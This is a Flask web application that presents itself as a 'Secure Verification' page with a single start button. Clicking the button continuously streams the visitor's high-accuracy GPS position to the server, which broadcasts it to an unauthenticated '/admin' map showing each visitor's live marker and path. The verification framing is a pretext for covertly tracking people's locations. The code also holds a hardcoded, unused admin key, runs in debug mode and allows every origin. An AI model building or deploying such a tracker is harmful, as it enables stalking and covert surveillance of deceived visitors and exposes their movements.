from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import os, re, requests
from datetime import datetime
from collections import defaultdict

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

ADMIN_KEY = "0949205717As"

# ---------------- TRACK STORAGE ----------------
user_tracks = defaultdict(list)
user_paths = defaultdict(list)

# --------- Helpers ---------
MOBILE_RE = re.compile(r"Android|iPhone|iPad|iPod|Mobile", re.I)

def detect_device(ua: str):
    if not ua:
        return "unknown"
    return "mobile" if MOBILE_RE.search(ua) else "desktop"


def calc_reliability(acc, percent, proxy, device):
    score = 0

    if acc <= 20: score += 45
    elif acc <= 50: score += 35
    elif acc <= 100: score += 25
    elif acc <= 200: score += 15
    elif acc <= 500: score += 8
    else: score += 3

    try:
        score += int(percent) * 0.3
    except:
        pass

    if device == "mobile":
        score += 5

    if str(proxy).lower() == "true":
        score -= 30

    return max(0, min(100, int(score)))


# ================= HOME =================
@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure Verification</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>

<style>
body{margin:0;font-family:Arial;background:#0b0b1a;color:white;text-align:center}
#map{height:100vh}
#panel{
  position:absolute;top:10px;left:10px;
  background:#111;padding:12px;border-radius:10px;z-index:999
}
button{
  padding:10px 15px;border:none;
  background:#6c5ce7;color:white;
  border-radius:8px;cursor:pointer
}
</style>
</head>
<body>

<div id="panel">
<h3>🔐 Verification</h3>
<button onclick="start()">เริ่ม</button>
<p id="status"></p>
</div>

<div id="map"></div>

<script>

let socket = io();
let watchId;
let map = L.map('map').setView([13.7,100.5],6);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

let marker;
let pathLine = L.polyline([], {color:'lime'}).addTo(map);

function start(){

  if(!navigator.geolocation){
    alert("No GPS");
    return;
  }

  watchId = navigator.geolocation.watchPosition(pos=>{

    let data = {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy
    };

    socket.emit("gps", data);

    document.getElementById("status").innerText =
      "accuracy: " + Math.round(data.acc) + "m";

  },{
    enableHighAccuracy:true,
    maximumAge:0,
    timeout:15000
  });
}

socket.on("server_update", data=>{

  // marker
  if(!marker){
    marker = L.marker([data.lat,data.lon]).addTo(map);
  } else {
    marker.setLatLng([data.lat,data.lon]);
  }

  // path
  pathLine.addLatLng([data.lat,data.lon]);

  map.setView([data.lat,data.lon], 16);
});

</script>

</body>
</html>
"""


# ================= ADMIN =================
@app.route("/admin")
def admin():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Admin Live</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>

<style>
body{margin:0;background:#0b0b1a;color:white}
#map{height:100vh}
</style>
</head>
<body>

<div id="map"></div>

<script>

let socket = io();
let map = L.map('map').setView([13.7,100.5],6);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

let markers = {};
let paths = {};

socket.on("server_update", data=>{

  let id = data.id;

  // marker
  if(!markers[id]){
    markers[id] = L.marker([data.lat,data.lon]).addTo(map);
  } else {
    markers[id].setLatLng([data.lat,data.lon]);
  }

  // path
  if(!paths[id]){
    paths[id] = L.polyline([], {color:'lime'}).addTo(map);
  }

  paths[id].addLatLng([data.lat,data.lon]);

});

</script>

</body>
</html>
"""


# ================= SOCKET =================
@socketio.on("gps")
def gps(data):
    sid = request.sid

    lat = float(data.get("lat"))
    lon = float(data.get("lon"))
    acc = float(data.get("acc", 999))

    # -------- smoothing (last 5) --------
    user_tracks[sid].append((lat, lon, acc))
    user_tracks[sid] = user_tracks[sid][-10:]

    valid = [p for p in user_tracks[sid] if p[2] < 500]
    recent = valid[-5:] if len(valid) >= 5 else valid

    if recent:
        lat = sum(p[0] for p in recent) / len(recent)
        lon = sum(p[1] for p in recent) / len(recent)

    user_paths[sid].append((lat, lon))
    user_paths[sid] = user_paths[sid][-50:]

    emit("server_update", {
        "id": sid,
        "lat": lat,
        "lon": lon,
        "acc": acc
    }, broadcast=True)


# ================= RUN =================
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=10000, debug=True)
